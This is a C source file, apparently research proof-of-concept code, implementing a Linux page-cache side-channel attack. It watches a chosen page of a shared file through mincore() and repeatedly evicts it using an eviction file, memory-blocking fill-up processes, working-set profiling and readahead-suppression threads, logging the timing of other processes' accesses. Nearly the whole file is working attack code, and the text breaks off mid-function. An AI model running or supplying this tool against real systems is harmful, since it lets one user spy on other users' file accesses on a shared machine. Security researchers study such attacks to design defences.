/*-----------------------------------------------------------------------------
 * main.c
 *
 * A program demonstrating the exploitation of a side channel based on
 * virtual memory and shared memory. To run this demo program you should have
 * swapping disabled.
 *
 * Usage: ./ev_chk [target file] [page to watch] <-s> <-e executable> <-t file>
 * 
 *  [target file]
 *      The shared file which contains the page to which accesses
 *      should be monitored.
 * 
 *  [page to watch] 
 *      The file offset in pages of the target page.
 * 
 *  -s (optional)
 *      Collects statistics about eviction attempts as csv. 
 *      (accessed eviction memory -> "histogram_mem.csv", 
 *      eviction runtime -> "histogram_time.csv") 
 * 
 *  -e executable (optional) 
 *      Allows to specify an executable which is signaled in case of 
 *      an detected event (SIGUSR1).
 * 
 *  -t file (optional)
 *      Collects information about detected events as csv.
 *      (count, timestamp, eviction runtime, accessed eviction memory)
 *
 * Erik Kraft
 */

// needed to support additional features
#define _GNU_SOURCE
#define _DEFAULT_SOURCE

/*-----------------------------------------------------------------------------
 * INCLUDES
 */
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <fts.h>
#include <memory.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <wait.h>
#include <zconf.h>
#include <assert.h>
#include <limits.h>
#include "cmdline.h"
#include "dynarray.h"
#include "list.h"
#include "pageflags.h"
#include "filemap.h"
#include "config.h"

/*-----------------------------------------------------------------------------
 * DEFINES
 */

// general defines
//#define _DEBUG_
//#define _DETAILED_EVICTION_SET_STAT_
// file names, paths
#define EVICTION_FILENAME "eviction.ram"
#define HISTOGRAM_FILENAME_TIME "histogram_time.csv"
#define HISTOGRAM_FILENAME_MEM "histogram_mem.csv"

// defines used for parsing command line arguments
#define SWITCHES_COUNT 3
#define STATISTIC_SWITCH 0
#define EXT_EVENT_APP_SWITCH 1
#define TRACE_SWITCH 2
const char *SWITCHES_STR[SWITCHES_COUNT] = {"-s", "-e", "-t"};
const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = {0, 1, 1};
#define MANDATORY_ARGS 2
#define BINARY_FILENAME_ARG 0
#define TARGET_OFFSET_ARG 1
#define USAGE_MSG "Usage: %s [target file] [page to watch] <-s> <-e executable> <-t file>\n\n" \
                  "\t[target file]\n"                                                          \
                  "\t\tThe shared file which contains the page to which accesses\n"            \
                  "\t\tshould be monitored.\n\n"                                               \
                  "\t[page to watch]\n"                                                        \
                  "\t\tThe file offset in pages of the target page.\n\n"                       \
                  "\t-s (optional)\n"                                                          \
                  "\t\tCollects statistics about eviction attempts as csv.\n"                  \
                  "\t\t(accessed eviction memory -> \"histogram_mem.csv\",\n"                  \
                  "\t\teviction runtime -> \"histogram_time.csv\")\n\n"                        \
                  "\t-e executable (optional)\n"                                               \
                  "\t\tAllows to specify an executable which is signaled in case of\n"         \
                  "\t\tan detected event (SIGUSR1).\n\n"                                       \
                  "\t-t file (optional)\n"                                                     \
                  "\t\tCollects information about detected events as csv.\n"                   \
                  "\t\t(count, timestamp, eviction runtime, accessed eviction memory)\n"

// inits/limits for data structures
#define ARRAY_INIT_CAP 10
#define IN_LINE_MAX 255

// output TAGS with ANSI colors
#define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
#define INFO "\x1b[34;1m[INFO]\x1b[0m "
#define EVENT "\x1b[33;1m[EVENT]\x1b[0m "
#define DEBUG "\x1b[35;1m[DEBUG]\x1b[0m "
#define OK "\x1b[32;1m[OK]\x1b[0m "
#define FAIL "\x1b[31;1m[FAIL]\x1b[0m "
#define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
#define WARNING "\x1b[33;1m[WARNING]\x1b[0m "

// component TAGS
#define WS_MGR_TAG "[WS Manager] "
#define BS_MGR_TAG "[BS Manager] "
#define SS_Thread_TAG "[SS Thread] "

/*-----------------------------------------------------------------------------
 * MACROS
 */
#ifdef _DEBUG_
#define DEBUG_PRINT(x) printf x
#else
#define DEBUG_PRINT(x) \
    do                 \
    {                  \
    } while (0)
#endif

/*-----------------------------------------------------------------------------
 * TYPE DEFINITIONS
 */
typedef struct _PageSequence_
{
    size_t offset_;
    size_t length_;
} PageSequence;

typedef struct _CachedFile_
{
    int fd_;
    size_t size_;
    size_t size_pages_;
    size_t resident_memory_;
    DynArray resident_page_sequences_;
} CachedFile;

typedef struct _FillUpProcess_
{
    pid_t pid_;
    size_t fillup_size_;
} FillUpProcess;

typedef struct _AttackEvictionSet_
{
    FileMapping mapping_;
    size_t initialise_samples_;
    size_t initialise_max_runs_;
} AttackEvictionSet;

typedef struct _AttackWorkingSet_
{
    int evaluation_ : 1;
    int eviction_ignore_evaluation_ : 1;
    int64_t unused_ : 62; // align to 8bytes

    char **search_paths_;
    size_t mem_in_ws_;
    size_t tmp_mem_in_ws_;
    List resident_files_;
    List non_resident_files_;
    List tmp_resident_files_;
    List tmp_non_resident_files_;
    size_t ps_add_threshold_;
    size_t access_thread_count_;
    size_t access_threads_per_pu_;
    DynArray access_threads_;
    struct timespec access_sleep_time_;
    struct timespec evaluation_sleep_time_;
    size_t profile_update_all_x_evaluations_;
} AttackWorkingSet;

typedef struct _AttackBlockingSet_
{
    char *meminfo_file_path_;
    DynArray fillup_processes_;
    size_t def_fillup_size_;
    size_t min_available_mem_;
    size_t max_available_mem_;
    struct timespec evaluation_sleep_time_;
    sem_t initialized_sem_;
    uint8_t initialized_;
} AttackBlockingSet;

typedef struct _AttackSuppressSet_
{
    DynArray target_readahead_window_;
    struct timespec access_sleep_time_;
} AttackSuppressSet;

typedef struct _PageAccessThreadData_
{
    pthread_mutex_t resident_files_lock_;
    List resident_files_;
    struct timespec sleep_time_;
    int running_;
    pthread_t tid_;
    pthread_attr_t thread_attr_;
} PageAccessThreadData;

typedef struct _Attack_
{
    int use_attack_ws_ : 1;
    int use_attack_bs_ : 1;
    int mlock_self_ : 1;
    int64_t unused_ : 61; // align to 8 byte

    AttackEvictionSet eviction_set_;
    AttackWorkingSet working_set_;
    pthread_t ws_manager_thread_;
    size_t mincore_check_all_x_bytes_;

    AttackBlockingSet blocking_set_;
    pthread_t bs_manager_thread_;

    FileMapping target_obj_;
    size_t target_page_;
    void *target_addr_;

    AttackSuppressSet suppress_set_;
    size_t ss_thread_count_;
    DynArray ss_threads_;

    FileMapping event_obj_;
    pid_t event_child_;

    struct timespec sample_wait_time_;
    struct timespec event_wait_time_;
} Attack;

/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */

// helper functions for custom datatypes
int initCachedFile(CachedFile *cached_file);
void closeCachedFile(void *arg);
void closeCachedFileArrayFreeOnly(void *arg);
void initFillUpProcess(FillUpProcess *fp);
void closeFillUpProcess(void *arg);
void closeThread(void *arg);
void initAttackEvictionSet(AttackEvictionSet *es);
void closeAttackEvictionSet(AttackEvictionSet *es);
int initAttackWorkingSet(AttackWorkingSet *ws);
void closeAttackWorkingSet(AttackWorkingSet *ws);
int initAttackBlockingSet(AttackBlockingSet *bs);
void closeAttackBlockingSet(AttackBlockingSet *bs);
int initAttackSuppressSet(AttackSuppressSet *ss);
void closeAttackSuppressSet(AttackSuppressSet *ss);
void initPageAccessThreadData(PageAccessThreadData *ps_access_thread_data);
void closePageAccessThreadData(void *arg);
int initAttack(Attack *attack);
void exitAttack(Attack *attack);

// attack function related
void configAttack(Attack *attack);
int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path);
int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold);
int pageSeqCmp(void *node, void *data);
int blockRAM(AttackBlockingSet *bs, size_t fillup_size);
void releaseRAM(AttackBlockingSet *bs, size_t release_size);
void releaseRAMCb(void *arg1, void *arg2);
size_t evictTargetPage(Attack *attack);
void *bsManagerThread(void *arg);
size_t parseAvailableMem(char *meminfo_file_path);
void *wsManagerThread(void *arg);
void preparePageAccessThreadData(AttackWorkingSet *ws);
int reevaluateWorkingSet(AttackWorkingSet *ws);
int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws);
void *pageAccessThread(void *arg);
void *suppressThread(void *arg);
size_t getMappingCount(const unsigned char *status, size_t size_in_pages);
void usageError(char *app_name);

/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static int running = 1;
static int eviction_running = 0;
static int used_pus = 0;
static int MAX_PUS = 0;
static size_t PAGE_SIZE = 0;

/*-----------------------------------------------------------------------------
 * SIGNAL HANDLERS
 */
void quitHandler(int signal)
{
    // __ATOMIC_RELAXED = no thread ordering constraints
    __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
}

/*-----------------------------------------------------------------------------
 * CODE
 */
int main(int argc, char *argv[])
{
    // general variables
    struct sysinfo system_info;
    struct sigaction quit_act = {0};
    int ret = 0;

    // variables used for processing command line arguments
    CmdLineConf cmd_line_conf =
        {
            .mandatory_args_count_ = MANDATORY_ARGS,
            .switches_count_ = SWITCHES_COUNT,
            .switches_ = SWITCHES_STR,
            .switches_arg_count_ = SWITCHES_ARG_COUNT};
    CmdLineParsed parsed_cmd_line;
    char *endptr = NULL;

    // variables used for statistics
    size_t mem_accessed = 0, event_mem_accessed = 0;
    FILE *histogram_time_file = NULL, *histogram_mem_file = NULL, *trace_file = NULL;
    struct timespec eviction_start, eviction_end, unix_epoch;
    size_t elapsed_time_eviction_ns = 0, eviction_time_eviction_sum_ns = 0, event_eviction_time_ns = 0;
    size_t eviction_count = 0;
    size_t event_counter = 0, event_time = 0;

    // variables necessary for general attack function
    size_t target_offset = 0;
    char target_obj_path[PATH_MAX] = {0};
    Attack attack = {0};
    FileMapping self_mapping = {0};
    unsigned char target_page_status;
    size_t event_hold = 0;
    pid_t event_child = 0;
    cpu_set_t cpu_mask;
    pthread_attr_t thread_attr;

    // set output buffering to lines (needed for automated testing)
    setvbuf(stdout, NULL, _IOLBF, 0);

    // process command line arguments
    if (parseCmdArgs(&argv[1], argc - 1, &cmd_line_conf, &parsed_cmd_line) != 0)
    {
        usageError(argv[0]);
        goto error;
    }

    // initialise random generator
    srand(time(NULL));

    // get number of cpus
    MAX_PUS = get_nprocs();
    printf(INFO "%d PUs available...\n", MAX_PUS);

    //  limit execution on CPU 0 by default
    CPU_ZERO(&cpu_mask);
    CPU_SET(0, &cpu_mask);
    sched_setaffinity(0, sizeof(cpu_mask), &cpu_mask);
    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;

    // later used to set thread affinity
    pthread_attr_init(&thread_attr);

    // register signal handler for quiting the program by SRTG+C
    quit_act.sa_handler = quitHandler;
    ret = sigaction(SIGINT, &quit_act, NULL);
    ret += sigaction(SIGQUIT, &quit_act, NULL);
    ret += sigaction(SIGUSR1, &quit_act, NULL);
    if (ret != 0)
    {
        printf(FAIL "Error at registering signal handlers...\n");
        goto error;
    }

    // initialising attack structure
    if (initAttack(&attack) != 0)
    {
        printf(FAIL "Error at initialising attack configuration...\n");
        goto error;
    }

    // sample configuration
    configAttack(&attack);

    // get system information
    ret = sysinfo(&system_info);
    if (ret != 0)
    {
        printf(FAIL "Error (%s) at sysinfo...\n", strerror(errno));
        goto error;
    }
    printf(INFO "Total usable ram: %zu\n", system_info.totalram);

    // get system page size
    PAGE_SIZE = sysconf(_SC_PAGESIZE);
    if (PAGE_SIZE == -1)
    {
        printf(FAIL "Error (%s) at syscconf...\n", strerror(errno));
        goto error;
    }
    printf(INFO "System page size: %zu\n", PAGE_SIZE);

    // calculate target page offset in byte
    target_offset = strtoul(parsed_cmd_line.mandatory_args_[TARGET_OFFSET_ARG], &endptr, 10);
    if (endptr == parsed_cmd_line.mandatory_args_[TARGET_OFFSET_ARG] || *endptr != 0 ||
        (target_offset == ULONG_MAX && errno == ERANGE) || target_offset > ULONG_MAX / PAGE_SIZE)
    {
        usageError(argv[0]);
        goto error;
    }
    target_offset *= PAGE_SIZE;

    // optional: mlock self
    if (attack.mlock_self_)
    {
        // map self
        if (mapFile(&self_mapping, argv[0], O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
        {
            printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), argv[0]);
            goto error;
        }

        // mlock self
        ret = mlock(self_mapping.addr_, self_mapping.size_);
        if (ret != 0)
        {
            printf(FAIL "Error (%s) at mlock: %s...\n", strerror(errno), argv[0]);
        }
    }

    // get access path of target binary relative to root
    if (realpath(parsed_cmd_line.mandatory_args_[BINARY_FILENAME_ARG], target_obj_path) == NULL)
    {
        printf(FAIL "Error (%s) at realpath: %s...\n", strerror(errno),
               parsed_cmd_line.mandatory_args_[BINARY_FILENAME_ARG]);
        goto error;
    }

    // map target object
    if (mapFile(&attack.target_obj_, target_obj_path, O_RDONLY, PROT_READ, MAP_PRIVATE) != 0)
    {
        printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), target_obj_path);
        goto error;
    }

    // check if target page is out of bound
    if (target_offset > attack.target_obj_.size_)
    {
        printf(FAIL "Target page out of bound!\n");
        goto error;
    }
    printf(INFO "Target offset: %zx\n", target_offset);
    // save target page and address
    attack.target_page_ = target_offset / PAGE_SIZE;
    attack.target_addr_ = (uint8_t *)attack.target_obj_.addr_ + target_offset;

    // calcualte page addresses in near surrounding of the target page (for suppressing readahead)
    for (size_t p = attack.target_page_ < READAHEAD_PAGES ? 0 : attack.target_page_ - READAHEAD_PAGES;
         p < attack.target_page_; p++)
    {
        void *address = (uint8_t *)attack.target_obj_.addr_ + p * PAGE_SIZE;
        if (!dynArrayAppend(&attack.suppress_set_.target_readahead_window_, &address))
        {
            printf(FAIL "Error at dynArrayAppend...\n");
            goto error;
        }
    }

    // optional: map and mlock event binary
    if (parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0] != NULL)
    {
        // map event binary
        if (mapFile(&attack.event_obj_, parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0],
                    O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
        {
            printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
            goto error;
        }

        ret = mlock(attack.event_obj_.addr_, attack.event_obj_.size_);
        if (ret != 0)
        {
            printf(FAIL "Error (%s) at mlock: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
        }

        attack.event_child_ = fork();
        if (attack.event_child_ < 0)
        {
            printf(FAIL "Error (%s) at fork...\n", strerror(errno));
            goto error;
        }
        else if (attack.event_child_ == 0)
        {
            char *event_argv[] = {NULL};
            execv(parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0], event_argv);
            printf(FAIL "Error (%s) at execv: %s\n", strerror(errno), parsed_cmd_line.switch_args_[EXT_EVENT_APP_SWITCH][0]);
            goto error;
        }
    }

    // create statistic files if wanted
    if (parsed_cmd_line.switch_states_[STATISTIC_SWITCH])
    {
        // create histogram time data file
        histogram_time_file = fopen(HISTOGRAM_FILENAME_TIME, "w");
        if (histogram_time_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), HISTOGRAM_FILENAME_TIME);
            goto error;
        }
        ret = fprintf(histogram_time_file, "Sample;Eviction duration (ns)\n");
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), HISTOGRAM_FILENAME_TIME);
            goto error;
        }

        // create histogram mem data file
        histogram_mem_file = fopen(HISTOGRAM_FILENAME_MEM, "w");
        if (histogram_mem_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), HISTOGRAM_FILENAME_MEM);
            goto error;
        }
        ret = fprintf(histogram_mem_file, "Sample;Used eviction set (kB)\n");
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), HISTOGRAM_FILENAME_MEM);
            goto error;
        }
    }

    // create trace file
    if (parsed_cmd_line.switch_args_[TRACE_SWITCH][0] != NULL)
    {
        trace_file = fopen(parsed_cmd_line.switch_args_[TRACE_SWITCH][0], "w");
        if (trace_file == NULL)
        {
            printf(FAIL "Error (%s) at fopen: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[TRACE_SWITCH][0]);
            goto error;
        }
        ret = fprintf(trace_file,
                      "Target object: %s\nTarget page: %zu\n"
                      "Event count;Time (ns);Eviction duration (ns);Used eviction set (kB)\n",
                      target_obj_path, target_offset / PAGE_SIZE);
        if (ret < 0)
        {
            printf(FAIL "Error (%s) at fprintf: %s...\n", strerror(errno), parsed_cmd_line.switch_args_[TRACE_SWITCH][0]);
            goto error;
        }
    }

    // create eviction file if it doesn't exist
    printf(PENDING "Trying to create a %zu MB random file.\nThis might take a while...\n", system_info.totalram / 1024 / 1024);
    ret = createRandomFile(EVICTION_FILENAME, system_info.totalram);
    if (ret != 0)
    {
        printf(FAIL "Error(%s) at createRandomFile...\n", strerror(errno));
        goto error;
    }

    // map eviction memory
    if (mapFile(&attack.eviction_set_.mapping_, EVICTION_FILENAME, O_RDONLY, PROT_READ | PROT_EXEC, MAP_PRIVATE) != 0)
    {
        printf(FAIL "Error (%s) at mapFile for: %s ...\n", strerror(errno), EVICTION_FILENAME);
        goto error;
    }

    printf(PENDING "Initialising...\n");
    if (attack.use_attack_ws_)
    {
        printf(PENDING "Profiling working set...\n");
        if (profileAttackWorkingSet(&attack.working_set_, target_obj_path) != 0)
        {
            printf(FAIL "Error at profileAttackWorkingSet...\n");
            goto error;
        }
        printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
               attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
    }

    // next thread(s) by default on different core
    CPU_ZERO(&cpu_mask);
    CPU_SET(used_pus, &cpu_mask);
    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;

    // readahead surpressing threads for target
    for (size_t i = 0; i < attack.ss_thread_count_; i++)
    {
        pthread_t tid;

        // by default run on a different core if possible
        if (pthread_create(&tid, &thread_attr, suppressThread, (void *)&attack.suppress_set_) != 0)
        {
            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
        }

        dynArrayAppend(&attack.ss_threads_, &tid);
    }

    // manager for working set
    if (attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
    {
        printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
    }

    // manager for blocking set
    if (attack.use_attack_bs_)
    {
        if (pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
        {
            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
        }
        else
        {
            // wait till blocking set is initialized
            sem_wait(&attack.blocking_set_.initialized_sem_);
        }
    }

    printf(OK "Ready...\n");
    // main event loop
    while (running)
    {
        if (mincore(attack.target_addr_, PAGE_SIZE, &target_page_status) != 0)
        {
            printf(FAIL "Error (%s) at mincore...\n", strerror(errno));
            continue;
        }

        if (clock_gettime(CLOCK_REALTIME, &unix_epoch) != 0)
        {
            printf(FAIL "Error (%s) at clock_gettime...\n", strerror(errno));
        }

        // event detected
        if (target_page_status & 1)
        {
            if (!event_hold)
            {
                event_hold = 1;
                event_eviction_time_ns = 0;
                event_mem_accessed = 0;
                event_counter++;

                printf(EVENT "%zu. event fired! Unix epoch timestamp: %zu s %zu us\n", event_counter, unix_epoch.tv_sec,
                       unix_epoch.tv_nsec / 1000);

                // send signal to event process
                if (event_child != 0)
                {
                    nanosleep(&attack.event_wait_time_, NULL);

                    if (kill(event_child, SIGUSR1) != 0)
                    {
                        printf(FAIL "Error (%s) at signaling event process...\n", strerror(errno));
                    }

                    sched_yield();
                }
            }

            // trying to evict
            ret = clock_gettime(CLOCK_MONOTONIC, &eviction_start);
            mem_accessed = evictTargetPage(&attack);
            ret += clock_gettime(CLOCK_MONOTONIC, &eviction_end);

            if (ret != 0)
            {
                printf(FAIL "Error (%s) at clock_gettime...\n", strerror(errno));
            }
            else
            {
                // eviction time of single try
                elapsed_time_eviction_ns = (eviction_end.tv_sec - eviction_start.tv_sec) * 1000000000UL +
                                           (eviction_end.tv_nsec - eviction_start.tv_nsec);
                // sum of all evivtion times
                eviction_time_eviction_sum_ns += elapsed_time_eviction_ns;
                // eviction time per event
                event_eviction_time_ns += elapsed_time_eviction_ns;
                // accessed memory per event
                event_mem_accessed += mem_accessed;

                DEBUG_PRINT((DEBUG "Accessed approx. %zu kB of eviction memory (elapsed time %zu)..\n",
                             mem_accessed / 1024, elapsed_time_eviction_ns));

                // write statistical data
                if (parsed_cmd_line.switch_states_[STATISTIC_SWITCH])
                {
                    fprintf(histogram_time_file, "%zu;%zu\n", eviction_count, elapsed_time_eviction_ns);
                    fprintf(histogram_mem_file, "%zu;%zu\n", eviction_count, mem_accessed / 1024);
                }
            }

            eviction_count++;
        }
        else if (!(target_page_status & 1) && event_hold)
        {
            printf(EVENT "Released (eviction took %zu us, accessed %zu kB)\n\n", event_eviction_time_ns / 1000,
                   event_mem_accessed / 1024);

            if (parsed_cmd_line.switch_states_[TRACE_SWITCH])
            {
                fprintf(trace_file, "%zu;%zu;%zu;%zu\n", event_counter, event_time, event_eviction_time_ns, event_mem_accessed / 1024);
            }

            event_hold = 0;
        }

        sched_yield();
    }

    if (event_counter > 0)
    {
        printf(INFO "Mean time to eviction per event: %f ns..\n", (double)eviction_time_eviction_sum_ns / event_counter);
    }

    goto cleanup;

error:
    ret = -1;

cleanup:

    pthread_attr_destroy(&thread_attr);

    exitAttack(&attack);
    if (attack.mlock_self_)
    {
        closeFileMapping(&self_mapping);
    }

    if (trace_file != NULL)
    {
        fclose(trace_file);
    }
    if (histogram_time_file != NULL)
    {
        fclose(histogram_time_file);
    }
    if (histogram_mem_file != NULL)
    {
        fclose(histogram_mem_file);
    }

    freeCmdLineParsed(&cmd_line_conf, &parsed_cmd_line);

    return ret;
}

/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR CUSTOM STRUCTS
 */
int initCachedFile(CachedFile *cached_file)
{
    memset(cached_file, 0, sizeof(CachedFile));
    cached_file->fd_ = -1;
    if (!dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}

void closeCachedFile(void *arg)
{
    CachedFile *cached_file = arg;

    if (cached_file->fd_ >= 0)
    {
        close(cached_file->fd_);
        cached_file->fd_ = -1;
    }
    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}

void closeCachedFileArrayFreeOnly(void *arg)
{
    CachedFile *cached_file = arg;

    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}

void initFillUpProcess(FillUpProcess *fp)
{
    memset(fp, 0, sizeof(FillUpProcess));
}

void closeFillUpProcess(void *arg)
{
    FillUpProcess *fp = arg;

    if (fp->pid_ != 0)
    {
        kill(fp->pid_, SIGKILL);
    }
    fp->pid_ = 0;
}

void closeThread(void *arg)
{
    pthread_t *thread = arg;

    pthread_join(*thread, NULL);
}

void initAttackEvictionSet(AttackEvictionSet *es)
{
    memset(es, 0, sizeof(AttackEvictionSet));
    initFileMapping(&es->mapping_);
}

void closeAttackEvictionSet(AttackEvictionSet *es)
{
    closeFileMapping(&(es->mapping_));
}

int initAttackWorkingSet(AttackWorkingSet *ws)
{
    memset(ws, 0, sizeof(AttackWorkingSet));
    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadData), ARRAY_INIT_CAP))
    {
        return -1;
    }
    listInit(&ws->resident_files_, sizeof(CachedFile));
    listInit(&ws->non_resident_files_, sizeof(CachedFile));
    listInit(&ws->tmp_resident_files_, sizeof(CachedFile));
    listInit(&ws->tmp_non_resident_files_, sizeof(CachedFile));

    return 0;
}

void closeAttackWorkingSet(AttackWorkingSet *ws)
{
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadData);
    listDestroy(&ws->resident_files_, closeCachedFile);
    listDestroy(&ws->non_resident_files_, closeCachedFile);
    listDestroy(&ws->tmp_resident_files_, closeCachedFile);
    listDestroy(&ws->tmp_non_resident_files_, closeCachedFile);
}

int initAttackBlockingSet(AttackBlockingSet *bs)
{
    memset(bs, 0, sizeof(AttackBlockingSet));
    if (!dynArrayInit(&bs->fillup_processes_, sizeof(pid_t), ARRAY_INIT_CAP))
    {
        return -1;
    }
    if (sem_init(&bs->initialized_sem_, 0, 0) != 0)
    {
        return -1;
    }

    return 0;
}

void closeAttackBlockingSet(AttackBlockingSet *bs)
{
    dynArrayDestroy(&bs->fillup_processes_, closeFillUpProcess);
    sem_destroy(&bs->initialized_sem_);
}

int initAttackSuppressSet(AttackSuppressSet *ss)
{
    memset(ss, 0, sizeof(AttackSuppressSet));
    if (!dynArrayInit(&ss->target_readahead_window_, sizeof(void *), ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}

void closeAttackSuppressSet(AttackSuppressSet *ss)
{
    dynArrayDestroy(&ss->target_readahead_window_, NULL);
}

void initPageAccessThreadData(PageAccessThreadData *page_access_thread_data)
{
    memset(page_access_thread_data, 0, sizeof(PageAccessThreadData));
    pthread_mutex_init(&page_access_thread_data->resident_files_lock_, NULL);
}

void closePageAccessThreadData(void *arg)
{
    PageAccessThreadData *page_access_thread_data = arg;

    if (page_access_thread_data->running_)
    {
        __atomic_store_n(&page_access_thread_data->running_, 0, __ATOMIC_RELAXED);
        pthread_join(page_access_thread_data->tid_, NULL);
        pthread_attr_destroy(&page_access_thread_data->thread_attr_);
    }
}

int initAttack(Attack *attack)
{
    memset(attack, 0, sizeof(Attack));

    initAttackEvictionSet(&attack->eviction_set_);

    if (initAttackWorkingSet(&attack->working_set_) != 0)
    {
        return -1;
    }

    if (initAttackBlockingSet(&attack->blocking_set_) != 0)
    {
        return -1;
    }

    initFileMapping(&attack->target_obj_);

    if (initAttackSuppressSet(&attack->suppress_set_) != 0)
    {
        return -1;
    }

    if (!dynArrayInit(&attack->ss_threads_, sizeof(pthread_t), ARRAY_INIT_CAP))
    {
        return -1;
    }

    initFileMapping(&attack->event_obj_);

    return 0;
}

void exitAttack(Attack *attack)
{
    // join all threads and kill all processes
    if (attack->event_child_ != 0)
    {
        kill(attack->event_child_, SIGKILL);
    }
    dynArrayDestroy(&attack->ss_threads_, closeThread);
    pthread_join(attack->bs_manager_thread_, NULL);
    closeAttackBlockingSet(&attack->blocking_set_);
    pthread_join(attack->ws_manager_thread_, NULL);

    // in reverse close remaining files, unmap and free memory
    closeAttackSuppressSet(&attack->suppress_set_);
    closeAttackWorkingSet(&attack->working_set_);
    closeAttackEvictionSet(&attack->eviction_set_);
    closeFileMapping(&attack->target_obj_);
    closeFileMapping(&attack->event_obj_);
}

/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK
 */

void configAttack(Attack *attack)
{
    attack->use_attack_ws_ |= DEF_USE_ATTACK_WS;
    attack->use_attack_bs_ |= DEF_USE_ATTACK_BS;
    attack->mlock_self_ |= DEF_MLOCK_SELF;

    attack->working_set_.evaluation_ |= DEF_WS_EVALUATION;
    attack->working_set_.eviction_ignore_evaluation_ |= DEF_WS_EVICTION_IGNORE_EVALUATION;
    attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
    attack->working_set_.ps_add_threshold_ = DEF_WS_PS_ADD_THRESHOLD;
    attack->working_set_.access_thread_count_ = DEF_WS_ACCESS_THREAD_COUNT;
    attack->working_set_.access_threads_per_pu_ = DEF_WS_ACCESS_THREADS_PER_PU;
    attack->working_set_.access_sleep_time_.tv_sec = DEF_WS_ACCESS_SLEEP_TIME_S;
    attack->working_set_.access_sleep_time_.tv_nsec = DEF_WS_ACCESS_SLEEP_TIME_NS;
    attack->working_set_.evaluation_sleep_time_.tv_sec = DEF_WS_EVALUATION_SLEEP_TIME_S;
    attack->working_set_.evaluation_sleep_time_.tv_nsec = DEF_WS_EVALUATION_SLEEP_TIME_NS;
    attack->working_set_.profile_update_all_x_evaluations_ = DEF_WS_PROFILE_UPDATE_ALL_X_EVALUATIONS;

    attack->mincore_check_all_x_bytes_ = DEF_MINCORE_CHECK_ALL_X_BYTES;

    attack->blocking_set_.meminfo_file_path_ = DEF_BS_MEMINFO_FILE_PATH;
    attack->blocking_set_.def_fillup_size_ = DEF_BS_FILLUP_SIZE;
    attack->blocking_set_.min_available_mem_ = DEF_BS_MIN_AVAILABLE_MEM;
    attack->blocking_set_.max_available_mem_ = DEF_BS_MAX_AVAILABLE_MEM;
    attack->blocking_set_.evaluation_sleep_time_.tv_sec = DEF_BS_EVALUATION_SLEEP_TIME_S;
    attack->blocking_set_.evaluation_sleep_time_.tv_nsec = DEF_BS_EVALUATION_SLEEP_TIME_NS;

    attack->ss_thread_count_ = DEF_SS_THREAD_COUNT;

    attack->sample_wait_time_.tv_sec = 0;
    attack->sample_wait_time_.tv_nsec = DEF_SAMPLE_WAIT_TIME_NS;
    attack->event_wait_time_.tv_sec = 0;
    attack->event_wait_time_.tv_nsec = DEF_EVENT_WAIT_TIME_NS;
}

int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
{
    FTS *fts_handle = NULL;
    FTSENT *current_ftsent = NULL;
    CachedFile current_cached_file = {0};
    size_t checked_files = 0;
    size_t memory_checked = 0;
    size_t mem_in_ws = 0;
    int ret = 0;

    // use fts to traverse over all files in the searchpath
    fts_handle = fts_open(ws->search_paths_, FTS_PHYSICAL, NULL);
    if (fts_handle == NULL)
    {
